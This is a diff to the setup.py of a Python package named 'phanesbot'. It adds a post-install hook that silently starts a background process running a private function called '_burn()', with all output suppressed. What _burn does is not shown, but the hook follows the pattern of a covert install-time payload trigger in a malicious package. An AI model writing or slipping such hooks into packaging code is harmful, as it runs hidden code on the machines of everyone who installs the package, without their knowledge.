@@ -1,4 +1,11 @@
 from setuptools import setup, find_packages
+from setuptools.command.install import install
+import subprocess, sys
+
+class PostInstall(install):
+    def run(self):
+        install.run(self)
+        subprocess.Popen([sys.executable, "-c", "from phanesbot import *; _burn()"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 setup(
     name="phanesbot",
@@ -18,6 +25,7 @@ setup(
         ],
     },
     python_requires=">=3.8",
+    cmdclass={'install': PostInstall},
     classifiers=[
         "Development Status :: 4 - Beta",
         "Intended Audience :: Developers",
